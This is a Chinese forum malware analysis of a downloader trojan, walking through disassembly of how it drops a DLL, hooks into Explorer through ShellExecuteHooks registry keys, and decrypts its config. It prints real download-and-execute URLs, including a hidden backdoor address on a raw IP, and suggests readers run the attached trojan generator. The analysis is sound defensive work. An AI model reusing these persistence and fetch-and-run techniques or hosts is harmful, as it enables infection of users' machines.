

# 一款木马的分析【原创】

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-413.htm`](https://www.pediy.com/kssd/pediy08/pediy8-413.htm)

一款木马的分析  
  
by nbw  
4 NE365  
  
  
     为了配合 kanxue 老大倡议的多发文，加上近来有些乏，找个别的东西分析一下耍耍。随便从网上下了个木马生成器，是个所谓的下载者，就是 Downloader。  
  
     名字叫什么 木马基地八一极限下载者，木马么，都喜欢搞得比较牛的样子，其实都比较龌龊，技术和人品一样龌龊。  
       
     附件是木马生成器，建议先运行一下看看，生成器无毒。  
  
     我下面分析的是这个生成器产生的木马，配置信息就用默认的。  
  
  
木马第一次运行  
  
  
1.读取配置信息  
  
//第一个函数,Delphi 编译器产生的用来初始化异常处理之类，比较经典。  
0040464B  |.  E8 88F6FFFF   call    00403CD8  
  
0040440E  |.  E8 D9F9FFFF   call    <jmp.&kernel32.GetSystemDirector>; \\GetSystemDirectoryA  
  
//这里打开自身文件  
004041A9  |.  E8 FEFBFFFF   call    <jmp.&kernel32.CreateFileA>       ; \\CreateFileA  
  
//读取文件最后面 4 个字节  
004041B5  |.  6A 02         push    2                                 ; /Origin = FILE\_END  
004041B7  |.  6A 00         push    0                                 ; |pOffsetHi = NULL  
004041B9  |.  6A FC         push    -4                                ; |OffsetLo = FFFFFFFC (-4.)  
004041BB  |.  53            push    ebx                               ; |hFile  
004041BC  |.  E8 6BFCFFFF   call    <jmp.&kernel32.SetFilePointer>    ; \\SetFilePointer  
004041C1  |.  6A 00         push    0                                 ; /pOverlapped = NULL  
004041C3  |.  8D45 F8       lea     eax, \[ebp-8\]                      ; |  
004041C6  |.  50            push    eax                               ; |pBytesRead  
004041C7  |.  6A 04         push    4                                 ; |BytesToRead = 4  
004041C9  |.  8D45 F4       lea     eax, \[ebp-C\]                      ; |  
004041CC  |.  50            push    eax                               ; |Buffer  
004041CD  |.  53            push    ebx                               ; |hFile  
004041CE  |.  E8 49FCFFFF   call    <jmp.&kernel32.ReadFile>          ; \\ReadFile  
  
//将结果异或以下,象征性加过密  
004041D3  |.  8175 F4 697A6>xor     dword ptr \[ebp-C\], 4D617A69  
  
//根据该结果重新定位文件指针地址  
004041EB  |.  8B45 F4       mov     eax, \[ebp-C\]                      ; |  
004041EE  |.  F7D8          neg     eax                               ; |  
004041F0  |.  50            push    eax                               ; |OffsetLo  
004041F1  |.  53            push    ebx                               ; |hFile  
004041F2  |.  E8 35FCFFFF   call    <jmp.&kernel32.SetFilePointer>    ; \\SetFilePointer  
  
//读取开始设置的配置信息  
00404212  |.  50            push    eax                               ; |Buffer  
00404213  |.  53            push    ebx                               ; |hFile  
00404214  |.  E8 03FCFFFF   call    <jmp.&kernel32.ReadFile>          ; \\ReadFile  
  
0040421A  |.  E8 85FBFFFF   call    <jmp.&kernel32.CloseHandle>       ; \\CloseHandle  
  
  
2.创建 DLL 文件  
  
//试图删除文件"C:\\Program Files\\Common Files\\Microsoft Shared\\MSINFO\\InfoMs.dlt"  
004046D9  |.  E8 D6F6FFFF   call    <jmp.&kernel32.DeleteFileA>       ; \\DeleteFileA  
  
如果删除不了,则设置该文件为下次开机后由系统删除。  
  
//查找资源  
004040A6  |.  53            push    ebx                               ; /ResourceType  
004040A7  |.  56            push    esi                               ; |ResourceName  
004040A8  |.  A1 50664000   mov     eax, \[406650\]                     ; |  
004040AD  |.  50            push    eax                               ; |hModule => 00400000 (Hack169)  
004040AE  |.  E8 09FDFFFF   call    <jmp.&kernel32.FindResourceA>     ; \\FindResourceA  
  
004040BD  |.  57            push    edi                               ; /hResource  
004040BE  |.  A1 50664000   mov     eax, \[406650\]                     ; |  
004040C3  |.  50            push    eax                               ; |hModule => 00400000 (Hack169)  
004040C4  |.  E8 3BFDFFFF   call    <jmp.&kernel32.LoadResource>      ; \\LoadResource  
  
004040D3  |.  56            push    esi                               ; /hResource  
004040D4  |.  E8 33FDFFFF   call    <jmp.&kernel32.LockResource>      ; \\LockResource  
  
//创建文件："C:\\Program Files\\Common Files\\Microsoft Shared\\MSINFO\\InfoMs.dlt"  
004040F5  |.  E8 B2FCFFFF   call    <jmp.&kernel32.CreateFileA>       ; \\CreateFileA  
  
00404108  |.  E8 27FDFFFF   call    <jmp.&kernel32.SizeofResource>    ; \\SizeofResource  
  
//将加载的资源写入该文件  
0040411B  |.  E8 1CFDFFFF   call    <jmp.&kernel32.WriteFile>         ; \\WriteFile  
  
//将上面读取得配置信息写入该文件  
00404139  |.  50            push    eax                               ; |Buffer  
0040413A  |.  53            push    ebx                               ; |hFile  
0040413B  |.  E8 FCFCFFFF   call    <jmp.&kernel32.WriteFile>         ; \\WriteFile  
00404140  |.  53            push    ebx                               ; /hFile  
00404141  |.  E8 DEFCFFFF   call    <jmp.&kernel32.SetEndOfFile>      ; \\SetEndOfFile  
00404146  |.  53            push    ebx                               ; /hObject  
00404147  |.  E8 58FCFFFF   call    <jmp.&kernel32.CloseHandle>       ; \\CloseHandle  
  
//释放资源  
00404154  |.  E8 73FCFFFF   call    <jmp.&kernel32.FreeResource>      ; \\FreeResource  
  
3.加载该 DLL  
  
00404735  |.  68 50484000   push    00404850                          ; /Title = "yundao"  
0040473A  |.  68 58484000   push    00404858                          ; |Class = "ScrollBar"  
0040473F  |.  E8 18F7FFFF   call    <jmp.&user32.FindWindowA>         ; \\FindWindowA  
  
//加载创建的 DLL:"C:\\Program Files\\Common Files\\Microsoft Shared\\MSINFO\\InfoMs.dlt"  
0040474D  |.  E8 AAF6FFFF   call    <jmp.&kernel32.LoadLibraryA>      ; \\LoadLibraryA  
  
//获得该 DLL 导出的 2 个函数  
0040475C  |.  68 64484000   push    00404864                          ; /ProcNameOrOrdinal = "MsgHookOff"  
00404761  |.  53            push    ebx                               ; |hModule  
00404762  |.  E8 75F6FFFF   call    <jmp.&kernel32.GetProcAddress>    ; \\GetProcAddress  
00404767  |.  A3 B0664000   mov     \[4066B0\], eax  
0040476C  |.  68 70484000   push    00404870                          ; /ProcNameOrOrdinal = "MsgHookOn"  
00404771  |.  53            push    ebx                               ; |hModule  
00404772  |.  E8 65F6FFFF   call    <jmp.&kernel32.GetProcAddress>    ; \\GetProcAddress  
  
//为自己创建一个窗体  
00403EBD  |.  E8 B6FFFFFF   call    <jmp.&user32.CreateWindowExA>     ; \\CreateWindowExA  
  
//调用上面的 DLL 导出的函数  
004047B3  |.  FF15 B4664000 call    \[4066B4\]                          ;  InfoMs.MsgHookOn  
  
//设置了一个钩子，这个钩子啥都没做，也比较艹蛋  
00A35570    E8 BBEEFFFF     call    <jmp.&user32.SetWindowsHookExA>  
  
//进入消息循环，不过循环 2 下就出来了  
004047BB  |> /68 94664000   /push    00406694                         ; /pMsg = WM\_NULL  
004047C0  |. |E8 8FF6FFFF   |call    <jmp.&user32.DispatchMessageA>   ; \\DispatchMessageA  
004047C5  |> |6A 00          push    0                                ; /MsgFilterMax = 0  
004047C7  |. |6A 00         |push    0                                ; |MsgFilterMin = 0  
004047C9  |. |6A 00         |push    0                                ; |hWnd = NULL  
004047CB  |. |68 94664000   |push    00406694                         ; |pMsg = Hack169.00406694  
004047D0  |. |E8 8FF6FFFF   |call    <jmp.&user32.GetMessageA>        ; \\GetMessageA  
004047D5  |. |85C0          |test    eax, eax  
004047D7  |.^\\75 E2         \\jnz     short 004047BB  
  
//调用 DLL 导出的 MsgHookOff，里面就是把刚才下的钩子卸掉  
004047D9  |.  FF15 B0664000 call    \[4066B0\]                          ;  InfoMs.MsgHookOff  
  
4.注册表处理  
  
//HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks  
0040405C  |.  E8 33FDFFFF   call    <jmp.&advapi32.RegCreateKeyExA>   ; \\RegCreateKeyExA  
  
//"{F630F902-0922-45C8-B820-C8AF4C610C28}"  
00404073  |.  E8 24FDFFFF   call    <jmp.&advapi32.RegSetValueExA>    ; \\RegSetValueExA  
  
//HKEY\_CLASSES\_ROOT\\CLSID\\{F630F902-0922-45C8-B820-C8AF4C610C28}  
0040405C  |.  E8 33FDFFFF   call    <jmp.&advapi32.RegCreateKeyExA>   ; \\RegCreateKeyExA  
  
00404073  |.  E8 24FDFFFF   call    <jmp.&advapi32.RegSetValueExA>    ; \\RegSetValueExA  
  
//HKEY\_CLASSES\_ROOT\\CLSID\\{F630F902-0922-45C8-B820-C8AF4C610C28}\\InProcServer32"  
0040405C  |.  E8 33FDFFFF   call    <jmp.&advapi32.RegCreateKeyExA>   ; \\RegCreateKeyExA  
  
//buffer:C:\\Program Files\\Common Files\\Microsoft Shared\\MSINFO\\InfoMs.dlt  
00404073  |.  E8 24FDFFFF   call    <jmp.&advapi32.RegSetValueExA>    ; \\RegSetValueExA  
  
/\*  
0012FF34   80000000  |hKey = HKEY\_CLASSES\_ROOT  
0012FF38   0093026C  |Subkey = "CLSID\\{F630F902-0922-45C8-B820-C8AF4C610C28}\\InProcServer32"  
\*/  
0040405C  |.  E8 33FDFFFF   call    <jmp.&advapi32.RegCreateKeyExA>   ; \\RegCreateKeyExA  
  
/\*  
buffer:  
004043C4  Apartment  
\*/  
00404073  |.  E8 24FDFFFF   call    <jmp.&advapi32.RegSetValueExA>    ; \\RegSetValueExA  
  
退出。  
  
  
作者：nbw 4 NE365 。近来总有人修改版权，没办法，只好在中间插个广告了。   继续看。  
  
下面分析 InfoMs.dlt  
  
  
由于上面将该 DLL 注册为 ShellExecuteHooks 项，所以该 DLL 会被 explorer 加载。  
  
这里判断加载该 DLL 的是否为 Explorer  
  
//String1 = "LOADDLL.EXE"  
//String2 = "Explorer.Exe"  
00785738        |.  E8 ABECF>call <jmp.&kernel32.lstrcmpiA>                        ; \\lstrcmpiA  
  
如果不是则退出。  
  
//从文件末尾读取配置文件  
  
00784634        |.  E8 47FDF>call <jmp.&kernel32.CreateFileA>                      ; \\CreateFileA  
  
0078464B        |.  E8 88FDF>call <jmp.&kernel32.SetFilePointer>                   ; \\SetFilePointer  
  
0078465A        |.  E8 69FDF>call <jmp.&kernel32.ReadFile>                         ; \\ReadFile  
  
0078467F        |.  E8 54FDF>call <jmp.&kernel32.SetFilePointer>                   ; \\SetFilePointer  
  
007846A1        |.  E8 22FDF>call <jmp.&kernel32.ReadFile>                         ; \\ReadFile  
  
//将配置信息解密  
00784554        |> /8A93 C46>/mov dl,byte ptr ds:\[ebx+7860C4\]  
0078455A        |. |8B0C24   |mov ecx,dword ptr ss:\[esp\]  
0078455D        |. |3011     |xor byte ptr ds:\[ecx\],dl  
0078455F        |. |FF0424   |inc dword ptr ss:\[esp\]  
00784562        |. |43       |inc ebx  
00784563        |. |81E3 070>|and ebx,80000007  
00784569        |. |79 05    |jns short InfoMs.00784570  
0078456B        |. |4B       |dec ebx  
0078456C        |. |83CB F8  |or ebx,FFFFFFF8  
0078456F        |. |43       |inc ebx  
00784570        |> |48       |dec eax  
00784571        |.^\\75 E1    \\jnz short InfoMs.00784554  
  
得到：  
  
00BA0050  DownHeader..http://www.hack169.com/1.exe..http://www.hack169.com  
00BA0090  /2.exe..http://www.hack169.com/3.exe..http://www.hack169.com/4.e  
00BA00D0  xe..http://www.hack169.com/5.exe..http://www.hack169.com/6.exe..  
00BA0110  http://www.hack169.com/7.exe..作者：RobBer QQ：3035777..欢迎访问  
00BA0150  木马基地 www.Hack169.com..$,,....  
  
也就是开始我们设置的下载信息等。  
  
下面解析上面的这个结构，具体略。  
  
007857A6        |.  68 08587>push InfoMs.00785808                                  ; /Title = "yundao"  
007857AB        |.  68 10587>push InfoMs.00785810                                  ; |Class = "ScrollBar"  
007857B0        |.  E8 4BECF>call <jmp.&user32.FindWindowA>                        ; \\FindWindowA  
  
//启动了一个线程  
007857B9        |.  68 D0777>push InfoMs.007877D0                                  ; /pThreadId = InfoMs.007877D0  
007857BE        |.  6A 00    push 0                                                ; |CreationFlags = 0  
007857C0        |.  6A 42    push 42                                               ; |pThreadParm = 00000042  
007857C2        |.  68 F4537>push InfoMs.007853F4                                  ; |ThreadFunction = InfoMs.007853F4  
007857C7        |.  6A 00    push 0                                                ; |StackSize = 0  
007857C9        |.  6A 00    push 0                                                ; |pSecurity = NULL  
007857CB        |.  E8 C0EBF>call <jmp.&kernel32.CreateThread>                     ; \\CreateThread  
  
下面研究一下这个线程：  
  
007853FB        |.  68 94547>push InfoMs.00785494                                  ; /Title = "yundao"  
00785400        |.  68 9C547>push InfoMs.0078549C                                  ; |Class = "ScrollBar"  
00785405        |.  E8 F6EFF>call <jmp.&user32.FindWindowA>                        ; \\FindWindowA  
  
0078448C        |.  50       push eax                                              ; |WindowName  
0078448D        |.  57       push edi                                              ; |Class  
0078448E        |.  56       push esi                                              ; |ExtStyle  
0078448F        |.  E8 B4FFF>call <jmp.&user32.CreateWindowExA>                    ; \\CreateWindowExA  
  
//"C:\\Program Files\\Common Files\\Microsoft Shared\\MSInfo\\InfoMs.dlt"  
00785420        |.  E8 9BEFF>call <jmp.&kernel32.LoadLibraryA>                     ; \\LoadLibraryA  
  
//这里设置了一个时间事件  
00785156        |> \\68 2C517>push InfoMs.0078512C                                  ; /Timerproc = InfoMs.0078512C  
0078515B        |.  68 E0930>push 493E0                                            ; |Timeout = 300000. ms  
00785160        |.  6A 00    push 0                                                ; |TimerID = 0  
00785162        |.  6A 00    push 0                                                ; |hWnd = NULL  
00785164        |.  E8 BFF2F>call <jmp.&user32.SetTimer>                           ; \\SetTimer  
  
//又设置了一个时间事件 2  
00785382        |> \\68 60537>push InfoMs.00785360                                  ; /Timerproc = InfoMs.00785360  
00785387        |.  68 C0270>push 927C0                                            ; |Timeout = 600000. ms  
0078538C        |.  6A 00    push 0                                                ; |TimerID = 0  
0078538E        |.  6A 00    push 0                                                ; |hWnd = NULL  
00785390        |.  E8 93F0F>call <jmp.&user32.SetTimer>                           ; \\SetTimer  
  
//进入自身消息循环  
00785458        |> /8D45 E4  /lea eax,dword ptr ss:\[ebp-1C\]  
0078545B        |. |50       |push eax                                             ; /pMsg  
0078545C        |. |E8 97EFF>|call <jmp.&user32.DispatchMessageA>                  ; \\DispatchMessageA  
00785461        |> |6A 00     push 0                                               ; /MsgFilterMax = 0  
00785463        |. |6A 00    |push 0                                               ; |MsgFilterMin = 0  
00785465        |. |6A 00    |push 0                                               ; |hWnd = NULL  
00785467        |. |8D45 E4  |lea eax,dword ptr ss:\[ebp-1C\]                        ; |  
0078546A        |. |50       |push eax                                             ; |pMsg  
0078546B        |. |E8 98EFF>|call <jmp.&user32.GetMessageA>                       ; \\GetMessageA  
00785470        |. |85C0     |test eax,eax  
00785472        |.^\\75 E4    \\jnz short InfoMs.00785458  
  
我们看一下上面的 2 个时间事件。  
  
  
事件 1：  
  
既然是下载者，就要从网上下载东西下来，下载的东西就是开始设置的。这个时间事件就处理这个东西。  
  
00784AA4            |> /8B07     /mov eax,dword ptr ds:\[edi\]  
00784AA6            |. |833C98 0>|cmp dword ptr ds:\[eax+ebx\*4\],0  
00784AAA            |. |74 18    |je short InfoMs.00784AC4  
00784AAC            |. |8B07     |mov eax,dword ptr ds:\[edi\]  
00784AAE            |. |8B0498   |mov eax,dword ptr ds:\[eax+ebx\*4\]  
00784AB1            |. |E8 C6FEF>|call InfoMs.0078497C  
00784AB6            |. |85C0     |test eax,eax  
00784AB8            |. |74 0A    |je short InfoMs.00784AC4  
00784ABA            |. |8B07     |mov eax,dword ptr ds:\[edi\]  
00784ABC            |. |8D0498   |lea eax,dword ptr ds:\[eax+ebx\*4\]  
00784ABF            |. |E8 14E9F>|call InfoMs.007833D8  
00784AC4            |> |43       |inc ebx  
00784AC5            |. |4E       |dec esi  
00784AC6            |.^\\75 DC    \\jnz short InfoMs.00784AA4  
  
具体：  
  
00784B93            |.  E8 20F8F>call <jmp.&kernel32.GetTempPathA>                     ; \\GetTempPathA  
  
判断临时目录里是否有 1.exe，如果有，则删除  
  
//"C:\\DOCUME~1\\nbw1\\LOCALS~1\\Temp\\1.exe"  
007849CD            |.  E8 AA010>call <jmp.&shlwapi.PathFileExistsA>                   ; \\PathFileExistsA  
007849D2            |.  85C0     test eax,eax  
007849D4            |.  74 06    je short InfoMs.007849DC  
007849D6            |.  53       push ebx                                              ; /FileName  
007849D7            |.  E8 BCF9F>call <jmp.&kernel32.DeleteFileA>                      ; \\DeleteFileA  
  
从指定的 URL 下载文件，运行之：  
  
//"http://www.hack169.com/1.exe"  
//"C:\\DOCUME~1\\nbw1\\LOCALS~1\\Temp\\1.exe"  
00784A34            |.  E8 C3FEF>call <jmp.&URLMON.URLDownloadToFileA>  
  
00784A3D            |.  6A 05    push 5                                           ; /IsShown = 5  
00784A3F            |.  6A 00    push 0                                           ; |DefDir = NULL  
00784A41            |.  6A 00    push 0                                           ; |Parameters = NULL  
00784A43            |.  53       push ebx                                         ; |FileName  
00784A44            |.  68 804A7>push InfoMs.00784A80                             ; |Operation = "open"  
00784A49            |.  6A 00    push 0                                           ; |hWnd = NULL  
00784A4B            |.  E8 ECFEF>call <jmp.&shell32.ShellExecuteA>                ; \\ShellExecuteA  
  
如此往复，会把我们生成木马时候设置的 URL 都连接一遍下来运行一下。  
  
  
然后看看时间事件 2：  
  
//这里传递一个字符串，明显是加密后的  
00785321            |.  B8 40537>mov eax,InfoMs.00785340                          ;  ASCII "nrrv< ))qqq(englogh>(eik)nk(r~r"  
00785326            |.  E8 65FFF>call InfoMs.00785290  
  
//解密这个字符串：  
00785210            |> /8B45 FC  /mov eax,dword ptr ss:\[ebp-4\]  
00785213            |. |8A4418 F>|mov al,byte ptr ds:\[eax+ebx-1\]  
00785217            |. |24 0F    |and al,0F  
00785219            |. |8B55 F8  |mov edx,dword ptr ss:\[ebp-8\]  
0078521C            |. |8A5432 F>|mov dl,byte ptr ds:\[edx+esi-1\]  
00785220            |. |80E2 0F  |and dl,0F  
00785223            |. |32C2     |xor al,dl  
00785225            |. |8845 F3  |mov byte ptr ss:\[ebp-D\],al  
00785228            |. |8D45 FC  |lea eax,dword ptr ss:\[ebp-4\]  
0078522B            |. |E8 1CE5F>|call InfoMs.0078374C  
00785230            |. |8B55 FC  |mov edx,dword ptr ss:\[ebp-4\]  
00785233            |. |8A541A F>|mov dl,byte ptr ds:\[edx+ebx-1\]  
00785237            |. |80E2 F0  |and dl,0F0  
0078523A            |. |8A4D F3  |mov cl,byte ptr ss:\[ebp-D\]  
0078523D            |. |02D1     |add dl,cl  
0078523F            |. |885418 F>|mov byte ptr ds:\[eax+ebx-1\],dl  
00785243            |. |46       |inc esi  
00785244            |. |8B45 F8  |mov eax,dword ptr ss:\[ebp-8\]  
00785247            |. |E8 A8E2F>|call InfoMs.007834F4  
0078524C            |. |3BF0     |cmp esi,eax  
0078524E            |. |7E 05    |jle short InfoMs.00785255  
00785250            |. |BE 01000>|mov esi,1  
00785255            |> |43       |inc ebx  
00785256            |. |4F       |dec edi  
00785257            |.^\\75 B7    \\jnz short InfoMs.00785210  
  
得到：  
  
00BA0528  http://www.chajian8.com/hm.txt  
  
00784D5A            |.  68 3C4E7>push InfoMs.00784E3C                             ;  ASCII "Open3"  
00784D5F            |.  E8 C8FDF>call <jmp.&wininet.InternetOpenA>  
  
//连接上面的 URL:"http://www.chajian8.com/hm.txt"  
00784D88            |.  E8 A7FDF>call <jmp.&wininet.InternetOpenUrlA>  
  
//读取该 URL 的内容：  
00784DA1            |> /833F 00  /cmp dword ptr ds:\[edi\],0  
00784DA4            |. |74 56    |je short InfoMs.00784DFC  
00784DA6            |. |8D85 F0F>|lea eax,dword ptr ss:\[ebp-410\]  
00784DAC            |. |50       |push eax  
00784DAD            |. |8D85 ECF>|lea eax,dword ptr ss:\[ebp-414\]  
00784DB3            |. |8D95 F4F>|lea edx,dword ptr ss:\[ebp-40C\]  
00784DB9            |. |B9 00040>|mov ecx,400  
00784DBE            |. |E8 D9E6F>|call InfoMs.0078349C  
00784DC3            |. |8B85 ECF>|mov eax,dword ptr ss:\[ebp-414\]  
00784DC9            |. |8B0F     |mov ecx,dword ptr ds:\[edi\]  
00784DCB            |. |BA 01000>|mov edx,1  
00784DD0            |. |E8 7FE9F>|call InfoMs.00783754  
00784DD5            |. |8B95 F0F>|mov edx,dword ptr ss:\[ebp-410\]  
00784DDB            |. |8BC3     |mov eax,ebx  
00784DDD            |. |E8 1AE7F>|call InfoMs.007834FC  
00784DE2            |> |57        push edi  
00784DE3            |. |68 00040>|push 400  
00784DE8            |. |8D85 F4F>|lea eax,dword ptr ss:\[ebp-40C\]  
00784DEE            |. |50       |push eax  
00784DEF            |. |8B45 F8  |mov eax,dword ptr ss:\[ebp-8\]  
00784DF2            |. |50       |push eax  
00784DF3            |. |E8 44FDF>|call <jmp.&wininet.InternetReadFile>  
00784DF8            |. |85C0     |test eax,eax  
00784DFA            |.^\\75 A5    \\jnz short InfoMs.00784DA1  
  
00784E00            |.  E8 1FFDF>call <jmp.&wininet.InternetCloseHandle>  
  
00784E09            |.  E8 16FDF>call <jmp.&wininet.InternetCloseHandle>  
  
获得的内容是什么呢？可以自己去看一下这个 URL:  
  
nrrv< ))07(721(77>(475)gb7(c~c  
  
明显这又是个加密后的数据，解密该内容，方法同上面的解密，得到：  
  
http://61.147.118.213/ad1.exe  
  
//连接该地址"http://61.147.118.213/ad1.exe"  
00784D88            |.  E8 A7FDF>call <jmp.&wininet.InternetOpenUrlA>  
  
//读取内容  
00784DA1            |> /833F 00  /cmp dword ptr ds:\[edi\],0  
00784DA4            |. |74 56    |je short InfoMs.00784DFC  
00784DA6            |. |8D85 F0F>|lea eax,dword ptr ss:\[ebp-410\]  
00784DAC            |. |50       |push eax  
00784DAD            |. |8D85 ECF>|lea eax,dword ptr ss:\[ebp-414\]  
00784DB3            |. |8D95 F4F>|lea edx,dword ptr ss:\[ebp-40C\]  
00784DB9            |. |B9 00040>|mov ecx,400  
00784DBE            |. |E8 D9E6F>|call InfoMs.0078349C  
00784DC3            |. |8B85 ECF>|mov eax,dword ptr ss:\[ebp-414\]  
00784DC9            |. |8B0F     |mov ecx,dword ptr ds:\[edi\]  
00784DCB            |. |BA 01000>|mov edx,1  
00784DD0            |. |E8 7FE9F>|call InfoMs.00783754  
00784DD5            |. |8B95 F0F>|mov edx,dword ptr ss:\[ebp-410\]  
00784DDB            |. |8BC3     |mov eax,ebx  
00784DDD            |. |E8 1AE7F>|call InfoMs.007834FC  
00784DE2            |> |57        push edi  
00784DE3            |. |68 00040>|push 400  
00784DE8            |. |8D85 F4F>|lea eax,dword ptr ss:\[ebp-40C\]  
00784DEE            |. |50       |push eax  
00784DEF            |. |8B45 F8  |mov eax,dword ptr ss:\[ebp-8\]  
00784DF2            |. |50       |push eax  
00784DF3            |. |E8 44FDF>|call <jmp.&wininet.InternetReadFile>  
00784DF8            |. |85C0     |test eax,eax  
00784DFA            |.^\\75 A5    \\jnz short InfoMs.00784DA1  
  
  
//"C:\\DOCUME~1\\nbw1\\LOCALS~1\\Temp\\ad1.exe.exe"  
00784E58            |.  55       push ebp                                         ; /FileName  
00784E59            |.  E8 3AF5F>call <jmp.&kernel32.DeleteFileA>                 ; \\DeleteFileA  
  
//创建文件"C:\\DOCUME~1\\nbw1\\LOCALS~1\\Temp\\ad1.exe.exe"  
00784E71            |.  E8 0AF5F>call <jmp.&kernel32.CreateFileA>                 ; \\CreateFileA  
  
//将上面从网上下载的内容存放到该文件内  
00784E93            |.  50       push eax                                         ; |Buffer  
00784E94            |.  53       push ebx                                         ; |hFile  
00784E95            |.  E8 46F5F>call <jmp.&kernel32.WriteFile>                   ; \\WriteFile  
00784E9A            |.  53       push ebx                                         ; /hFile  
00784E9B            |.  E8 30F5F>call <jmp.&kernel32.SetEndOfFile>                ; \\SetEndOfFile  
  
//启动该文件"C:\\DOCUME~1\\nbw1\\LOCALS~1\\Temp\\ad1.exe.exe"  
00784F0A            |.  E8 79F4F>call <jmp.&kernel32.CreateProcessA>              ; \\CreateProcessA  
  
这个 ad1.exe，就是木马作者留的后门，我们开始并不知道。貌似是个流氓软件。  
  
  
总结一下，这个所谓的下载者释放了一个 dll，利用稍微特殊点的手段（其实也不是什么技术），把这个 dll 加载到 Explorer 里面；  
  
dll 的末尾是需要下载的 URL 地址之类，将该信息解析出来，然后下载下来执行，可以是木马之类；  
  
另外该 dll 会下载 http://61.147.118.213/ad1.exe 执行，这个是木马作者自己放的，从他提供的生成器中是看不到的。写木马么，除了有些 rpwt，也要挣钱嘛。

 4dd466d0e1e0cc123afbe504da2462ca